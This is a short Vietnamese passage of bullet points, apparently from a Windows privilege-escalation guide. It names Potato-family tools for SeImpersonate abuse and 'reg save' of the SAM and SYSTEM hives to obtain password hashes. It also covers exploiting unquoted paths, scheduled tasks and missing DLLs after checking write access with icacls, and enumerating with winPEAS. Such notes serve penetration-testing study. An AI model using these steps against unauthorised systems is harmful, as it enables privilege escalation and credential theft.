+- Có SeImpersonate thì thử lần lượt PrintSpoofer, GodPotato, JuicyPotato; có SeBackup hoặc quyền quản trị thì `reg save` hai hive SAM và SYSTEM để lấy hash.
+- Đường dẫn không ngoặc, tác vụ lịch và DLL thiếu chỉ khai thác được khi bạn **ghi được** vào đúng chỗ: luôn `icacls` trước.
+- winPEAS tự động hoá việc liệt kê, nhưng hiểu từng kiểm tra trước để biết nó đang chỉ vào đâu khi tô đỏ một dòng.
